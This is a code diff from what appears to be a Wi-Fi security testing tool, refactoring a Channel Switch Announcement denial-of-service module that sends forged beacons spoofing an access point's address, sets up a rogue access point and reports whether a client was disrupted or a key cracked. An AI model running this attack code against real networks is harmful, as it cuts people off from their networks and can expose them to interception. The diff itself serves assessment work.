@@ -54,7 +54,7 @@ static Dot11Beacon patch_ies(const Dot11Beacon &src, const Channel &ap_channel) 
 	auto opts = src.options();
 	vector sorted_opts(opts.begin(), opts.end());
 
-	//TODO dd this to pdf (why is filtered)
+	//TODO add this to pdf (why is filtered)
 
 	// patch HT_OPERATION primary channel + VHT_OPERATION center channel
 	for(auto &o: sorted_opts) {
@@ -124,9 +124,7 @@ static Dot11Beacon patch_ies(const Dot11Beacon &src, const Channel &ap_channel) 
 		return static_cast<uint8_t>(a.option()) < static_cast<uint8_t>(b.option());
 	});
 
-	Dot11Beacon result;
-	result.addr1(src.addr1());
-	result.addr2(src.addr2());
+	Dot11Beacon result(src.addr1(), src.addr2());
 	result.addr3(src.addr3());
 	result.capabilities() = src.capabilities();
 	result.interval(src.interval());
@@ -186,9 +184,9 @@ void check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, c
 			ssid);
 
 	RadioTap csa_rt = get_CSA_beacon(ap_mac, ssid, ap_channel, new_channel, 3, beacon.get());
-	while(steady_clock::now() < end_time && !g_interrupted) {
+	while(steady_clock::now() < end_time) {
 		sender.send(csa_rt);
-		this_thread::sleep_for(milliseconds(ms_interval));
+		interruptible_sleep(milliseconds(ms_interval));
 	}
 }
 
@@ -199,7 +197,7 @@ void setup_chs_attack(RunStatus &rs) {
 	components::setup_rogue_ap(rs);
 }
 
-void run_chs_attack(RunStatus &rs) {
+void run_attack(RunStatus &rs) {
 	const auto &att_cfg = rs.config().at("attack_config");
 	const auto &ap = rs.get_actor("ap");
 
@@ -218,9 +216,9 @@ void run_chs_attack(RunStatus &rs) {
 
 	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
 	if(g_interrupted) return;
-	log(LogLevel::INFO, "Attack START");
+	rs.process_manager.write_log_all(ATTACK_START_tag);
 	check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel, ms_interval, attack_time);
-	log(LogLevel::INFO, "Attack END");
+	rs.process_manager.write_log_all(ATTACK_STOP_tag);
 	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
 
 	if(ap->conn) ap->conn->disconnect();
@@ -233,13 +231,9 @@ void generate_report(const RunStatus &rs, const vector<unique_ptr<GraphElements>
 	if(!report) return;
 
 	report << "# CSA DoS Attack\n\n";
-	//FIXME link to CSA attack
-	//report << "Channel switch announcement will change channel of station, station will disconnect\n\n";
+
 	report::attack_config_table(report, rs);
 	report::attack_mapping_table(report, rs);
-	//report << "### Traffic Analysis\n";
-	//report << "Charts represent the network speed captured during the test. (STA->AP)\n";
-	//TODO add hostapd helper ?
 
 	const path STA_graph_path = tshark_graph(rs, "client", elements);
 	if(!STA_graph_path.empty()) {
@@ -275,7 +269,7 @@ void generate_report(const RunStatus &rs, const vector<unique_ptr<GraphElements>
 	report << "---\n";
 }
 
-void stats_chs_attack(const RunStatus &rs) {
+void stats_attack(const RunStatus &rs) {
 	const string client_mac = rs.get_actor("client").get(SK::mac);
 
 	// --------------- report
@@ -298,11 +292,6 @@ void stats_chs_attack(const RunStatus &rs) {
 	nlohmann::json result{};
 	result["rogue_ap_connected"] = rogue_ap_connected;
 	if(crack_result) { result["cracked"] = crack_result.value().cracked != 0; }
-
-	/*FIXME add beacon protection column
-	 *if(){
-		attacker_pcap.beacon_prot_support = ;
-	}*/
 
 	rs.save_result(result);
 }
